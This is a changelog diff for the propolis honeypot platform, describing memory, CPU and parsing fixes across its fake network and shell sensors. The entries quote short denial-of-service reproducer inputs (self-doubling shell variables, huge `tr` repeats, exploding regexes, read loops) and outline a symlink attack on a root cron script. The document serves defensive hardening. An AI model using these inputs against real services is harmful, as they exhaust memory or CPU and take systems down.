+  and sorted them all for each 500 rows. New core-scoring migration `0021` adds the function
+  `ip_score_order_key` (the time-invariant key that ranks rows as their live scores rank at any
+  instant, already used for the table's keyset cursor) and `ip_score_order_idx` on it; both pages
+  now read the top of the index (3.5 s to 0.8 ms, and 490 ms to 5.6 ms). Both rank by the same
+  key, so the hero names the address the table lists first; two addresses tied at the 100 cap
+  used to be left to the planner and are now ordered by how far past the cap they are. A scored
+  append's update of an address's `ip_score` row is no longer heap-only (9 us against 24 us per
+  row over 100,000 updates). See [database](docs/reference/database.md#table-ip_score-per-ip-aggregate).
+- **A backup no longer refuses a disk with room for it** - the free-space check asked for the
+  raw database size plus the state directories, plus a fifth, but the set it writes is a
+  compressed dump: on a live node a 5.9 GB source made a 1.07 GB set, and the check refused every
+  upgrade (and would have refused the nightly backup) on a volume with 6 GB free. It now sizes the
+  run from the last good set, scaled by the source's growth since (recorded as `source_bytes` in
+  `last-success`), plus a fifth; the raw size stays the estimate when there is no earlier set. See
+  [backup and restore](docs/operations/backup-and-restore.md).
+- **The SMTP sensor no longer records a password as the username** - `AUTH LOGIN <base64
+  user>` (the RFC 4954 initial response, Python smtplib's default) had its argument ignored, so
+  the sensor prompted `Username:`, the client answered with its password, and that password
+  was stored as the `honeypot_login_attempt` username. The initial response is now the
+  username and only the password is prompted for (`=` is an empty initial response). A
+  one-NUL AUTH PLAIN blob (`user\0pass`) used to record its second field, the password; it
+  now records an empty username. `AUTH PLAIN` without an initial response is answered `334 `
+  and read from the next line, as Postfix does, instead of `502`, and a `*` answering a
+  challenge gets `501 5.7.0 Authentication aborted`. See
+  [sensor-smtp](docs/reference/sensor-behavior.md#sensor-smtp).
+- **A stalled BDAT chunk no longer pins its declared size in the SMTP sensor** - `BDAT <size>`
+  allocated the whole declared chunk (up to the 1 MB session budget) before reading it and
+  held it for the idle timeout, so a few hundred connections that sent all but the last byte
+  pushed the unit past `MemoryMax=256M` and got it OOM-killed. The chunk now streams through
+  a 4 KiB read into the 64 KiB retained body, every octet still counted against the session
+  budget; measured on 32 stalled 999,000-byte chunks, the heap grows about 64 KiB per
+  connection instead of about 1 MB.
+- **The SMTP sensor caps recipients like Postfix** - every `RCPT TO:` line pushed another
+  address with no count limit, about 4 MB of heap per 1 MB of input, so 64 sessions from one
+  source address OOM-killed the unit; the list also survived each message, so every further
+  `DATA` re-emitted it whole. The 1001st recipient of a transaction now gets Postfix's
+  `452 4.5.3 Error: too many recipients` (`smtpd_recipient_limit`), the message event keeps
+  the first 100 addresses with a new `rcpt_count` of all accepted ones, and the envelope is
+  cleared after each message as Postfix clears it.
+- **A long DATA line no longer drops the message in the SMTP sensor** - a body line of 8193
+  bytes or more, counting its line break, hit the 8192-byte read cap and was treated as an
+  unfinished transfer: after `354` the session closed with no reply, no event, and any
+  pipelined command unanswered, where Postfix accepts the message. The line's first 8192
+  bytes are now kept, the rest is drained to the line break and counted in `body_size`, and
+  the message is recorded with `truncated: true` and answered `250`.
+- **The SMTP sensor answers the ETRN it advertises** - EHLO listed `ETRN` but the command got
+  `502 command not recognized`, a contradiction a scanner can see. It now gets Postfix's
+  `etrn_cmd` replies: `459 <domain>: service unavailable` for a well-formed request (a stock
+  install flushes no domains), `500 Syntax: ETRN domain`, `501 Error: invalid parameter
+  syntax`, or `503 Error: MAIL transaction in progress`.
+- **A six-byte shell line no longer OOM-kills the daemon** - the dropper url extractor, which
+  the campaign indexer runs on every captured command and artifact inside the propolis daemon,
+  resolved `VAR=value` assignments by re-substituting every value until nothing changed. A value
+  that names itself twice squares its size on each pass, so typing `A=$A$A` into a honeypot
+  shell (or uploading a few hundred bytes of chained assignments) resolved to gigabytes, the
+  daemon was killed at its 1 GiB memory limit, and because the indexer's cursor only advances
+  after a batch commits, it was killed again on every restart. Each variable is now resolved
+  once, after the variables it references, and only when a url, a `for` list or a `tftp` pair
+  uses it, so unrelated assignments cost nothing; a cycle, an unassigned name or a value past
+  64 KiB stays as literal `$NAME`, so a url built on it is dropped as before; and all
+  substitution in one scan draws on a 256 KiB allowance, after which a url written out
+  literally is still found. Loaders resolve as before, and a forward chain is no longer limited
+  to 255 links. See
+  [rate limits and budgets](docs/reference/rate-limits-and-budgets.md#dropper-script-url-extraction).
+- **A glob pattern can no longer hold a shell sensor's worker for minutes** - `case WORD in
+  PATTERN)`, pathname expansion, `find -name`/`-path`, `dpkg -l` and `apt list` matched with a
+  backtracking loop that restarted the rest of the pattern at every character after a star (and
+  `find`'s and `dpkg`'s re-read a bracket expression at every character), while the line's work
+  allowance charged only the bytes of the pattern and subject. A `case` whose subject and pattern
+  came from a doubled variable (`case $a in *${a}b)`, 48,000 characters each) took about forty
+  seconds in an unoptimized build and minutes at the sizes the allowance admitted, on the runtime
+  worker every other session needed, so the SSH sensor stopped accepting connections until it
+  finished. Patterns now compile once into the pieces between their stars, with bracket
+  expressions merged into sorted ranges; a piece of plain text is found with the standard
+  library's linear substring search, so `*${a}b` answers in linear time, and every comparison
+  is charged to the line, which stops at a match it cannot pay for (a `?`-heavy piece searched
+  across a long subject). Ordinary patterns answer exactly as before: a differential test runs
+  the old matchers against the new on 400,000 generated patterns. See
+  [sensor behavior](docs/reference/sensor-behavior.md).
+- **`grep -F` searches in linear time, and `grep` pays for every search of a line** - a fixed
+  string was found by comparing it at every offset of the line, so a 192,001-byte needle that
+  failed at its last byte against a 384,000-byte line from `echo $a$a` cost about 3.7e10 byte
+  comparisons (three seconds in an unoptimized build, eight minutes with `-i`) while the
+  allowance charged the input's length. It is now found with a two-way searcher built once per
+  pattern (`memchr`, already in the build through `serde_json`; no new package), and `-i`
+  lowercases the needle once and each line once instead of folding every comparison. `-o` and
+  `-w` search a line again from later offsets, which the one charge per input never saw: `-w`
+  rejecting a match at every offset of a long run was still quadratic, through the fixed and
+  the regular-expression paths alike. Every search now counts what it read and the excess over
+  one pass is charged, and a scan past the line's allowance stops the line. Output is unchanged:
+  a differential test runs the old window scan against 2,000 generated `-F` cases under `-i -w
+  -x -o -c -v`.
+- **`pgrep` and `pkill` pay for their pattern matching** - a pattern of up to 64 alternatives of
+  256 items was run over every process row without being charged to the line's work allowance,
+  and allocated a fresh position set per item, so a heavy pattern cost about a second in an
+  unoptimized build and a loop of them held the runtime worker every other session needed. Each
+  alternative's steps (items times text length, plus the class range tests) are now taken from
+  the line's remaining allowance before it runs, and a selection that cannot pay stops the line.
+  The position sets are reused across items. An ordinary pattern selects the same rows as before.
+- **A flood of empty header lines no longer multiplies an HTTP connection's memory** - sensor-http
+  copied every header line holding a `:` into a table entry of 48 bytes, so a 16 KiB header
+  block of lone `:` lines (5,400 of them, 3 bytes each) cost about 260 KB, and 512 plaintext
+  plus 248 TLS connections holding such a block behind a slowly sent body got the 256 MiB unit
+  OOM-killed in a loopback reproduction. Header values are now read out of the block when the
+  event is built, so a request holds its header block once and nothing per line, and the block
+  is never buffered past 16384 bytes (the old reader read one 4 KiB chunk past the cap). A
+  block that has not ended by then gets nginx's `400 Bad Request` "Request Header Or Cookie Too
+  Large" page instead of a silent hang-up; a block within the cap is served whatever its lines,
+  as nginx serves one, since it skips a line like `:` as invalid. See
+  [sensor behavior](docs/reference/sensor-behavior.md#sensor-http).
+- **HTTP connections are charged to a session memory pool** - nothing bounded what the HTTP
+  sensor's connections held together: 512 a listener, 1,024 with HTTPS bound, each with its own
+  buffers, against a 256 MiB unit. Its binary now installs the accounting allocator the shell
+  sensors use and runs every connection, on both listeners, as an accounted session of one pool
+  of 70% of `MemoryMax` (187,904,815 bytes; HTTP has no capture budget, so it gets that share
+  too), a floor of 183,500 bytes for each of the 1,024. The most a connection was measured to
+  hold is 132,035 bytes (HTTPS, a full header block and a full body capture), so 1,024 at that
+  size fit inside the pool; the TLS handshake (about 110 KB a connection, 56 MB for 512) runs
+  before the session and is outside it, and the largest measured case, every connection in its
+  largest session, peaked at 139 to 151 MB of a 256 MiB unit; a session over its share while the pool is short is ended at
+  its next read, or at once while it waits for its peer. The session slot table grows from
+  1,023 to 2,047 so the HTTP sensor's sessions fit. The arithmetic is in
+  [capacity planning](docs/operations/capacity-planning.md#http-sensor-worst-case-memory).
+- **A slowly sent HTTP request no longer holds its buffers for ten minutes** - each read had its
+  own timeout (60 s) and nothing else, so a client sending a byte a minute kept a request's
+  header block and body capture until `max_duration` (600 s). The whole header block must now
+  arrive within the idle timeout of its first byte, as nginx's `client_header_timeout` times a
+  whole header, and the whole body within the idle timeout of the header's end (nginx times a
+  body per read; this limit is the sensor's own). A request cut this way is closed unanswered,
+  and one cut in its body is still recorded, with `body_complete: false`. At the defaults a
+  request holds its buffers for at most 150 s. See
+  [sensor behavior](docs/reference/sensor-behavior.md#sensor-http).
+- **A parked FTP control channel no longer takes the unit down with the uploads in flight** -
+  `sensor-ftp` does not read the control socket while a LIST or STOR waits for its data
+  connection or a STOR receives, or while it writes a reply, so what a client sends meanwhile
+  waits in the kernel, charged to the unit's cgroup and seen by no budget. Receive autotuning
+  let one parked connection hold about 150 KiB on loopback and 260 KiB at Internet MSS, and a
+  reply the client never read held the handler until `max_duration`. Ten uploads filling the
+  capture budget plus 480 parked control connections (plain and implicit TLS) OOM-killed the
+  256 M unit and lost all ten uploads. Each control socket's kernel buffers are now fixed at
+  32 KiB a direction before the banner (`clamp_socket_buffers`, a socket that cannot be clamped
+  is closed), and every reply write is bounded by the idle timeout and ends the session when
+  it runs out. The same load now peaks at about 157 MB with every upload recorded. See
+  [sensor behavior](docs/reference/sensor-behavior.md#sensor-ftp) and
+  [capacity planning](docs/operations/capacity-planning.md#kernel-socket-memory).
+- **MQTT clients that never read their replies, or leave a PUBLISH half sent, are bounded** -
+  `sensor-mqtt` does not read while it writes a reply, and a SUBACK carries one byte per
+  filter, so SUBSCRIBEs of empty filters a client never reads blocked the write for the whole
+  idle timeout while what it sent next waited in the kernel, about 0.74 MB a connection at
+  Internet MSS. A PUBLISH declaring 256 KiB and sent most of the way held that much heap
+  until the idle timeout too. Both together OOM-killed the 256 M unit. Each accepted socket's
+  kernel buffers are now fixed at 32 KiB a direction (a socket that cannot be clamped is
+  closed), a reply gets 5 s before the session ends, and the packet body is dropped before the
+  reply is written. The binary now runs every session in the session memory pool the shell
+  sensors use (30% of `MemoryMax`, shared by both listeners): a body still arriving is charged
+  to it, a session the pool cannot hold is ended with `end_reason` `memory_limit` on its
+  session-end event, and a connection that cannot get a slot is closed unanswered. The same
+  load now peaks at 129 to 140 MB across runs. **Upgrade check:** both listeners share the
+  session memory pool, so `sensor-mqtt` now refuses to start (exit 1, naming the value and the
+  listener count) when `PROPOLIS_MQTT_MAX_CONCURRENT` times the listener count leaves the pool
+  under 64 KiB a session: the largest value is 614 with `PROPOLIS_MQTT_TLS_BIND` set and 1,228
+  without. The default (256) is unaffected; a deployment that raised it past those limits must
+  lower it before upgrading.
+  See
+  [sensor behavior](docs/reference/sensor-behavior.md#sensor-mqtt) and
+  [capacity planning](docs/operations/capacity-planning.md#kernel-socket-memory).
+- **Freed SSH capture buffers no longer stay resident outside the capture budget** - a capture
+  body grows 64 KiB at a time, and once one large capture had been stored glibc raised its mmap
+  threshold to that size, so later bodies grew on the heap: a reallocation that could not extend
+  in place copied, and the block it freed stayed resident between the other bodies, charged to
+  no budget. Eight bodies growing to 10 MB at once left 71 MB resident past what they held, more
+  than the margin the worst-case memory sum keeps under `MemoryMax`. `sensor-ssh` now pins the
+  threshold at 128 KiB at startup, so a large body is its own mapping, grown in place by the
+  kernel and returned when freed; the same eight bodies leave under 0.5 MB. A build whose
+  allocator refuses the setting logs a warning at startup. See
+  [capacity planning](docs/operations/capacity-planning.md#ssh-sensor-worst-case-memory).
+- **Every log line reached the journal at priority 6 with ANSI escapes in it** - the stock
+  `tracing` format colours its output whether or not stdout is a terminal and gives journald no
+  level, so `journalctl -p warning` and anything keyed on priority saw no warning or error from
+  the daemon, the console, the sensors, the gateway or the shipper, and a plain `journalctl`
+  showed `\x1b[33m WARN\x1b[0m`. A new `log-format` crate, installed by every binary, writes
+  colour only to a terminal, and when `$JOURNAL_STREAM` names the process's own stdout (the
+  check systemd.exec(5) prescribes) prefixes each line with the sd-daemon(3) `<N>` level that
+  journald turns into the entry's priority: 3 error, 4 warning, 6 info, 7 debug. Off a terminal an
+  event is one line of at most 16 KiB, with newlines and other control characters written as
+  escapes, so a captured attacker string cannot start a second line (by newline, or by passing
+  journald's 48K `LineMax` split) carrying a forged priority. No new
+  dependency; terminal output is unchanged. See
+  [logging and journal priorities](docs/operations/health-and-observability.md#logging-and-journal-priorities).
+- **The review queue no longer offers a reserved address** - it listed, and the operator
+  approved, an RFC 1918 address that the gatekeeper then held as `Reserved` on every pass for as
+  long as the entry stayed approved. `populate` now skips every address `is_reserved_ip`
+  covers (RFC 1918, loopback, link-local, the documentation ranges and the rest), and each
+  queue scan resolves any reserved entry already queued, in any state but Rejected, to Rejected
+  with `decided_at` stamped and a note recording the automatic rejection, the state it was in
+  and any operator note. Nothing is deleted. A node that is fed documentation-range addresses
+  for testing will now show an empty queue; the repository's own tests opt out through
+  `ReviewQueue::offering_reserved_addresses` (or narrow the test with `with_reserved_classifier`),
+  both hidden from the docs and called by no daemon.
+- **The submission pass says why it held what it held** - a node logged `submitted=0
+  held=17202 failed=0` every pass, with the reason for each held address and vendor only at
+  debug level, so nothing showed why nothing was ever reported. The one INFO line per pass now
+  carries `held_by`, the held count split by reason (`disabled`, `cooldown`, `stale`,
+  `rate_limit`, `score_floor`, `category_filter`, `reserved`, `db_error`, `allowlisted`,
+  `no_vendor_config`), and at startup each vendor that is off logs one warning in plain words
+  (no API key set, or its `_ENABLED` variable not true) naming the variable to set, with a
+  second warning when no vendor is enabled at all.
+- **The submission pass no longer sorts an address's whole event history per address** - the
+  newest-`protocol_label`-per-category lookup (`SELECT DISTINCT ON (category) ...`) read and
+  sorted every event the address ever produced: 1.55 s for one heavy address on the live node,
+  once per approved address on every pass. New core-scoring migration `0020` adds
+  `event_source_category_observed_idx (source_ip, category, observed_at DESC)` and the lookup
+  takes the newest event of each category with one index probe each. For a test address with
+  200,000 events the query went from 480 ms to 0.35 ms. The index is built inside the migration
+  transaction, so writes to `event` wait for the build at the first start on the new version (see
+  `0013` for the cost on a large ledger). The probe is written as a row comparison on
+  `(source_ip, category)` ordered by the index's own columns: the plainer `source_ip = $1 AND
+  category = ... ORDER BY observed_at DESC LIMIT 1` let the planner, given a heavy address's
+  statistics, walk `event_observed_at_idx` backward instead, which measured 454-532 ms on a
+  400,000-event ledger and gained nothing over the old query.
+- **The fetcher stops re-reading the same download events every cycle** - the sync that turns
+  `honeypot_file_download` events into fetch rows anti-joined every such event against
+  `fetch_attempt` on `TRIM(url)` each cycle. An event whose URL the fetcher never stores (an
+  `ftp://` dropper, text that is not a URL) never gets a row, so it never left that query: one
+  live node read the same 5,951 events for 1.5 s every 12 s, indefinitely. The sync now walks
+  event ids past a persisted watermark (new review migration `0008`, table
+  `fetch_event_cursor`, one row shared by every node), in bounded chunks, so each event is
+  decided once whether or not it yields a row. Skipped URLs are counted in one INFO line and
+  still get no `fetch_attempt` row, as before. A URL that differs from a stored one only by a
+  character Rust `trim` strips but Postgres `TRIM` leaves (a trailing carriage return from a
+  telnet line) shares the stored row's `url_hash`, so it never got a row either and the old
+  query returned it every cycle; the watermark covers it too. The first sync after the upgrade
+  walks the whole existing ledger once, in bounded chunks (133 ms for the first chunk on a
+  400,000-event test ledger, since downloads are sparse there); the old query took 311 ms per
+  cycle and the steady-state sync query now takes under a millisecond.
+- **What sensor-redis sessions hold is bounded for the whole process** - each session's SET store
+  (up to 1 MiB) and read buffer (a command is buffered whole, up to about 1 MB, and the buffer
+  never shrank) were bounded per session only, and 256 sessions on each of the two listeners
+  held far more than the unit's 256 M `MemoryMax`: a probe from four addresses had the kernel
+  kill the sensor at about 230 filled sessions, dropping every session in flight, and could
+  repeat it after each restart. Past a floor of 16 KiB each, the buffer and the store are now
+  charged to one 16 MiB pool that every session of both listeners shares. A command the pool
+  cannot buffer ends its session with no reply, as a real Redis closes a client past its query
+  buffer limit, and a SET it cannot hold gets the OOM error (the SET event is still recorded);
+  a session gives its room back when its command is done and when it ends. 256 sessions on each
+  listener sending two 490,000-byte SETs each peaked at 817,840 KiB resident before and now
+  peak at 45 to 49 MiB on one CPU and 54 to 61 MiB with four runtime workers. See
+  [capacity planning](docs/operations/capacity-planning.md#redis-sensor-worst-case-memory).
+- **sensor-redis ends a reply write the peer never reads, and sanitizes an argument for the
+  ledger a chunk at a time** - a peer that pipelined commands and never read the replies held
+  the sensor blocked in the write for the rest of the session while the kernel kept the unsent
+  replies against the unit's memory; the write now gives up after the idle timeout. The ledger
+  field of a SET, CONFIG SET, EVAL or REPLICAOF argument was built by sanitizing the whole
+  argument, several full-length copies of up to 512 KiB (three times that for invalid UTF-8)
+  before cutting to 1 KiB; it now sanitizes 4 KiB at a time and stops once the field has its
+  1 KiB, so padding that sanitization removes (line breaks, NULs, zero-width characters,
+  terminal escapes) ahead of a payload cannot push the payload out of the record. A CONFIG
+  subcommand or parameter name is cut to 64 bytes before it is matched. One inline line is
+  held to 1024 arguments, as a multi-bulk array is; a longer one is a protocol error, where a
+  64 KiB line of one-byte words held about 1.4 MB of argument lists uncharged. INFO and
+  CONFIG GET report a `maxmemory` of 256 MiB, not 0, so the OOM reply a full pool gives no
+  longer contradicts them. A peer that opens many sessions and never reads can still hold the
+  kernel's send buffers (up to 4 MiB a socket) past the unit's limit inside the idle timeout;
+  see [capacity planning](docs/operations/capacity-planning.md#redis-sensor-worst-case-memory).
+- **sensor-redis reads a large command in time linear in its size** - the reader parsed the whole
+  buffered command again after every 1 KiB socket read and copied every element it had finished
+  on each pass, so one 900-element, 908 KB multi-bulk cost about twelve times the CPU of the same
+  bytes as 900 commands (thirty times in the red team's measurements), and 64 such connections
+  from one address kept 25 cores busy. The parser now resumes where the last read left it and
+  returns the arguments as ranges of the buffer, which the commands read in place: the same
+  multi-bulk now costs less than the 900 commands.
+- **The public-feed push no longer copies, opens or writes through what the daemon plants** -
+  `deploy/blocklist-sync.sh` runs from cron, as root on the documented layout, over the feed
+  directory the daemon owns, and copied `aggressive.* standard.* all-*.*` with `cp -f`: a symlink
+  planted there by a compromised daemon made root copy any file (a host key, the deploy key) into
+  the public repository and push it, a FIFO hung the cron for good, and the push marker was
+  written with `>` and `chmod` at a path in the same directory, so a link there made root
+  truncate, chmod or create any file. The script now enters the feed directory once (refusing a
+  symlinked one), accepts only the publisher's names and formats with every format present,
+  copies only single-link regular files of at most 32 MiB (256 MiB a build), binds each read
+  to the file it checked (it opens the name once with `O_NOFOLLOW|O_NONBLOCK`, so a link is never
+  followed and a FIFO cannot hold the open, compares the device and inode of that open
+  descriptor with the pre-open stat, and reads only from that descriptor, so a link swapped in
+  around the open is refused even if the name is restored), and stages the copies so a
+  refusal leaves the checkout untouched. `deploy/install.sh` and `deploy/upgrade.sh` now install the root-owned
+  copy under `/usr/local/lib/propolis` that the cron runs. The marker moved to `/var/lib/propolis/blocklist-status/last-pushed`, a
+  directory the daemon cannot write, written by temporary file and rename. `provision.sh`
+  creates a `propolis-blocklist` account to run it as, which cannot read root's files at all.
+  See [routine procedures](docs/operations/routine-procedures.md#stage-2---publish-to-a-public-repository-operator-cron).
+
+- **One shell line can no longer freeze or exhaust the SSH, telnet or ADB sensor** - a line runs
+- **Shell commands that walked or allocated past their charge now pay for it (SSH, telnet, ADB)** - a line runs
+  synchronously on a runtime worker, so a fake command that walks or allocates past what it
+  charges to the line's work allowance stalls every session of that sensor, or takes it past its
+  `MemoryMax` and gets it killed. GNU `tr` walked a `[c*N]` repeat one byte at a time, up to
+  2^64-2 steps: `tr -s a '[b*18446744073709551614]'` (37 bytes) held the telnet and SSH sensors
+  until restarted, with no event written. It now marks a repeat's byte once and pairs two
+  repeats without walking them, which gives the same sets and translation. `tee` added another
+  copy of its input to its output for every `-` operand, so `head -c 1000000 /dev/zero | tee`
+  with a hundred dashes asked for over 300 MB; `-` is now a file name, as GNU's tee treats it
+  (`echo hi | tee - | wc -c` is 3 and leaves a file named `-`), and each file's copy is charged
+  before it is made. `cut --output-delimiter` put an attacker-sized delimiter before every field
+  and charged the output only after building all of it (20 KB of commas and a 3,000-byte
+  delimiter made 218 MB); its output now stops the line once it would pass what the line can
+  still pay for, and a long `-b`/`-f` list is merged and binary-searched, where
+  65,536 spans were scanned for every input byte. `crontab FILE`, `systemctl`'s unit lookups and
+  `pm install` read up to 1 MiB per call and charged none of it, so `while :; do crontab
+  /bin/busybox; done` held the telnet sensor for about ten minutes per line and `systemctl status`
+  re-read and echoed a 180 KB unit once per operand (200 operands, 118 MB); each read is now
+  charged to the line before it is made, and `crontab -e` no longer reads the file it only needs
+  to find. The echo-loader tracker digested a typed assembly twice per `>>` append and again on
+  every `chmod`, uncharged (about 23 ms per one-byte append to a 180 KB assembly in a debug
+  build); it now hashes the file once per append and charges the read, rewrite and digest to
+  the line once, as it charges the read for a `chmod` or run. awk's `getline < FILE` (up to 4 MiB
+  per trip) and its `>>` output, `dd` (`if=FILE`, and the file `conv=notrunc` or `seek=` keeps),
+  `tail FILE` and `grep -f FILE` read a file and charged none of it, or only the few bytes they
+  printed, so a loop around `close()`, `dd`, `tail -c 1` or `grep -F -f /bin/busybox /dev/null`
+  held the sensor past 40 s and left a fresh login with no prompt. The charge now sits in the
+  one function every file read of a command goes through, `read_operand` (and `read_source` for
+  standard input), so a reader cannot skip it: the callers that charged for their own reads
+  no longer do, the evaluator charges a command's output only beyond what its reads already
+  paid (`cat` of a file costs the line once), and a test lists every direct filesystem read so a
+  new one has to be accounted for. `grep` compiled every pattern of an `-e` or `-f` list before it
+  charged any of them, so a pattern file of 4,096 lines (53,248 bytes) of the 12-byte
+  `(a{255}){31}`, each of which compiles to about 200 KB, held some 800 MB at once; each pattern
+  is now charged (its bytes, then the heap it compiled to) as it is built, the list stops at
+  4,096 patterns or 4 MiB of compiled programs with GNU's `grep: memory exhausted`, and a single
+  pattern past 32 KiB reads as `Regular expression too big`, as one past the instruction limit
+  already did. awk compiled every `/re/` literal of its program and charged none of them
+  (512 literals of `/(a{255}){31}/`, a 7,680-byte program, grew the heap by 101 MB); each
+  literal's source and compiled heap are now charged as it is parsed, under the same 4,096
+  literal and 4 MiB caps, and a program past them fails with `awk: out of memory` (mawk's
+  wording, [unverified]) and status 2; the line itself ends only when its work allowance is what
+  ran out. `grep` reads its operands through the same door, so
+  it pays for a file once: the read charge covers the first scan pass and only the matchers' work
+  beyond it is charged on top (`grep x /bin/busybox`, 2,193,272 bytes, stays inside the line's
+  4,194,304-unit allowance). `crates/sensor-telnet/tests/shell_cost.rs`
+  runs the reproducers through the real listener (the `tail`, `grep -f`, `dd` and awk-literal
+  cases among them) and holds every line to 20 s and to `LINE_WORKING_SET_BYTES` of heap;
+  `crates/sensor-adb/tests/shell_cost.rs` does the same for the ADB sensor's commands.
+  **Still open:** a line is not yet bounded in time everywhere. awk compiles a dynamic regex (a
+  string used as a pattern, as in `x ~ p`) again on every evaluation and charges only the scan, and the compiler dedupes character sets in quadratic time,
+  so one 225-byte awk line looping a pattern of some 1,900 distinct brackets held a worker for
+  45 s in a release build. That is a separate follow-up; until it lands this change does not
+  promise that no single line can hold a worker.
+- **The HTTP sensor cuts credentials out of the request fields it records** - the platform
+  rule is that a submitted password is never placed in any event field, and the SSH and
+  credential sensors keep it, but sensor-http stored the request target, the query string and
+  a body preview verbatim, so a password typed into a fake login form landed in the ledger. The
+  value of every password-like name (`password`, `pass`, `pw`, `secret`, `token`, `api-key`,
+  `pin`, `otp`, `senha` and the rest, matched as a whole, as a segment, or by the substring
+  `pass`) is now `<redacted>` in the query string, in the request target, and in url-encoded,
+  JSON (a container value whole), XML (elements, attributes and struct members) and multipart
+  bodies; a login-shaped XML-RPC call (`wp.*`, `metaWeblog.*`, `blogger.*`, `mt.*`,
+  `system.multicall`, the `xmlrpc.php` brute-force shape) keeps its first parameter and loses
+  the rest. The parameter names and usernames stay; the password of an absolute-form
+  `user:password@host` target does not. `Authorization` and `Proxy-Authorization` are recorded
+  as their scheme plus, for `Basic` and `Digest`, the username (`auth_scheme`,
+  `auth_username`, `proxy_auth_scheme`, `proxy_auth_username`); a value with no scheme word is
+  the credential and is recorded as `<redacted>`. A `Cookie` header is recorded as its names
+  with every value replaced (`cookie`); none of the three was recorded before. An event where a
+  value was replaced carries `credentials_redacted: true`; a request without credentials
+  serializes exactly as before. The scanners match the names and shapes real clients send, so
+  a sender that disguises its own request can still get a secret through; the privacy doc
+  lists those classes. See
+  [sample and credential privacy](docs/security/sample-and-credential-privacy.md#credential-handling).
+- **A sensor bound that is set and wrong now refuses to start on every sensor** - `sensor-smtp`
+  and `sensor-cred` read their timeouts, capture limit and concurrency limit through a parser
+  that fell back to the default on a value it could not parse, so a typo in their env file
+  (`PROPOLIS_SMTP_MAX_CONCURRENT=ten`, `PROPOLIS_CRED_MAX_DURATION_SECS=0`) ran the sensor with a
+  limit other than the one written and said nothing; the same two skipped a malformed WAN map
+  entry instead of refusing it. All twelve sensors now read every variable through one set of
+  typed readers in the framework, so a zero, negative, non-numeric or over-maximum bound, a
+  malformed bind address or a bad WAN map entry exits 1 before anything binds, naming the
+  variable and quoting the value. A missing or blank variable still takes its documented default.
+  See [environment variables](docs/reference/environment-variables.md#sensor-binaries).
+- **The hash-chain check no longer stalls the monitor** - the whole-ledger scan ran inside the
+  ops monitor's loop, so on a large ledger every other condition went unevaluated for minutes
+  every six hours. It now runs as its own task and the monitor serves its last verdict.
+- **What a client's shell sessions can make a sensor hold is bounded** - nothing bounded what one SSH,
+  telnet or ADB session could make its fake shell hold: 256 SSH connections of 10 idle shells
+  measured 1.05 GB against a 512 M `MemoryMax`, and a single shell grew without limit by typing
+  (doubling positional parameters, 50 MB; holding `/dev/zero` open on every descriptor, 64 MB;
+  nested `bash`, 7 KB a level; functions that parse to 230 times their text). The three sensors
+  now count what each session really allocates and bound it: 8 MiB a session between lines, about
+  29 MiB while a line runs, and a pool of 30% of `MemoryMax` shared by every session: when it runs
+  out, a session past its floor gets no more (its line stops), one within its floor still gets
+  what it is owed, and while sessions hold more than the pool the ones furthest over their fair
+  shares are ended one at a time. A line that would pass the
+  limit stops at its next step; a session over it is ended (`end_reason` `memory_limit`); SSH
+  refuses a new shell or exec while the pool is nearly full. History now keeps at most 64 KiB of
+  lines, and `export name` of a new name counts against the variable allowance. Every allocation
+  in those three sensors carries a 16-byte header. See
+  [capacity planning](docs/operations/capacity-planning.md#session-memory-sensor-ssh-sensor-telnet-sensor-adb-sensor-mqtt).
+- **`$SHLVL` counts nested shells** - it stayed 1 however many `bash` or `su` levels a session
+  opened, where a real bash adds one to the `SHLVL` it inherits and exports it, so `bash; echo
+  $SHLVL` printing 1 was a tell. Each bash level now counts itself in (a value that is not a number
+  counts as 0, one that reaches 1000 starts again at 1); dash and mksh leave it alone. bash's
+  warning at 1000 is not printed.
+- **A panic while a held line ran no longer loses the input it had captured** - while the shell
+  reads a held input in place the capture body is empty, so a panic unwound through it recorded an
+  empty body, which records nothing. The shell now reads a shared handle to the bytes and the
+  input keeps its own, so the bytes are recorded (as cut off by the cancellation) however the line
+  ends. The overhead test now also measures `HeldInput::finish`, the path production takes, and
+  asserts at every input size.
+- **Storing a capture no longer holds an async worker** - the hand-off worker hashed, wrote and
+  fsynced a body of up to 10 MB on the async runtime, which the SSH sensor runs with two worker
+  threads. The store now runs on the blocking pool; the body moves with it, so its budget
+  reservation is held until the store returns and refunded the moment it does.
+- **A captured binary of 8 to 16 MiB is now scanned for indicators** - the scan refused anything
+  over 8 MiB, so a sample of 8 to 10 MB, which SCP, SFTP and the other sensors' uploads reach,
+  showed "not scanned" on its page.
+  The scan limit is now the largest body a sensor keeps, the SSH spool's 16 MiB cap (one
+  definition, `sensor_framework::SPOOL_MAX_FILE_BYTES`, shared by the SSH sensor and the scan),
+  and the page names it. The module comment that said a larger body was scanned in part now says it is not
+  scanned. A sample already marked `too_big` keeps that state (it is terminal in
+  `ioc_artifact_scan`); deleting its row there queues it for the scan again. No migration.
+- **Queued SSH output is charged by what it holds, not its length** - a reply buffer that had
+  grown by doubling kept up to twice its length (heap measured at 2.08 times the charge), so the
+  64 MiB output budget bounded less memory than it said. Output and input held behind a backed-up
+  queue are now trimmed to their bytes and charged by allocation.
+- **A few SSH peers that do not read can no longer stall every other session** - the output
+  budget they fill is now shared fairly. Two or three connections that never read could hold all
+  of the 64 MiB output budget, and then every other session's shell, exec, SCP and SFTP waited
+  (a reply took 20 s, until the peer's own keepalive woke the session). Now a session that cannot
+  be served asks the connection holding the most to let go, never itself, and is served when the
+  budget is refunded; a refund wakes waiting sessions at once; a connection whose queued output
+  makes no progress for 30 s is closed (`output_stalled`), and one asked to let go is closed
+  (`output_evicted`), both written into the `end_reason` of any capture in flight on it; a
+  packet that cannot print a line reserves 256 KiB, not 9 MiB; SCP and SFTP frames do not wait
+  for queue room. A connection holds at most 24 MiB of the budget in all.
+- **The SSH sensor no longer queues unbounded output for a peer that does not read** - a peer
+  could advertise a zero window, then type lines that each print up to 4 MiB (10 channels a
+  connection, 256 connections), and the sensor held all of it in memory with no budget. Output
+  is now charged to a 64 MiB process-wide output budget through an allowance reserved before each
+  unit of work runs; a channel stops running further lines at one line of unsent output and a
+  connection at two; input behind a backed-up queue waits in order, charged, and runs when the
+  peer reads, never dropped; and if the budget cannot hold what is waiting the session ends. A
+  connection holding output unread is still closed at `max_duration`. No configuration option.
+- **A held input is no longer copied per reader** - a command waiting for its input (`cat > f`,
+  `sh`) copied the capture three times as it ran, about 3.1 times a 10 MB body, uncharged, per
+  worker thread. The shell now reads the capture buffer in place, which stays charged to the
